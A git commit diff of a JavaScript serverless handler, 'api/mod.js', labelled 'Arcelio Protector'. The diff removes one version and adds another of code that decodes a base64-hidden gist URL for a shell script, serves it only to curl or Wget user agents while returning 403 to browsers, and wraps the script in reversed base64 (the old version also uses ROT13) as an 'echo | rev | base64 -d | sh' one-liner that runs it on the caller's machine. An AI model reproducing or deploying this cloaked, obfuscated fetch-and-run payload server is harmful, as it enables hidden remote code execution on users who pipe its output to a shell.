904d8c70dd33551d584f14d4943f9f8b6f7f46c2
VannXD0 <holilmustofa5@gmail.com>
2026-06-25 02:03:11 +0700

    Update mod.js

--- api/mod.js
+++ api/mod.js
@@ -1,14 +1,19 @@
+// Arcelio Protector - Vercel Final Deployment
 export default async function handler(a, b) {
-  const s = Buffer.from("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WYW5uWEQwL2U3YmEzNGYxZDY0MWQ0MGYyMDlmYzBiZjg5OWJjNmZmL3Jhdy9kZDFjNDYwMjMzNWM5OTZkYWI3Nzk5OTE5YjRiNmY2YmQzYmRhMTBjL0FyYy5zaA==", 'base64').toString();
-  const h = a.headers['user-agent'] || "";
-  if (!/curl|Wget|libcurl/i.test(h)) return b.status(403).send("Access Denied");
-  try {
-    const d = await fetch(s);
-    const e = await d.text();
-    const enc = Buffer.from(e).toString('base64').split('').reverse().join('').replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26));
-    b.setHeader("Content-Type", "text/plain");
-    return b.status(200).send(`echo "${enc}" | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rev | base64 -d | sh`);
-  } catch (err) {
-    b.status(500).send("Unauthorized");
-  }
+    const _0x1 = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WYW5uWEQwL2U3YmEzNGYxZDY0MWQ0MGYyMDlmYzBiZjg5OWJjNjZmL3Jhdy9hNjIzNzk5ZjkwZGU5MTIwZDkwNGNiNWNlNmYwZGNhOWVmMDkwOTM0L0FyYy5zaA==";
+    const _0x2 = atob(_0x1);
+    
+    try {
+        const _0x3 = a.headers['user-agent'] || "";
+        if (!_0x3.includes("curl") && !_0x3.includes("Wget")) return b.status(403).send("403 Forbidden");
+
+        const _0x4 = await fetch(_0x2);
+        const _0x5 = await _0x4.text();
+        const _0x6 = Buffer.from(_0x5).toString('base64').split('').reverse().join('');
+        
+        b.setHeader("Content-Type", "text/plain");
+        return b.status(200).send(`echo "${_0x6}" | rev | base64 -d | sh`);
+    } catch (_0x7) {
+        return b.status(500).send("echo 'Err'");
+    }
 }
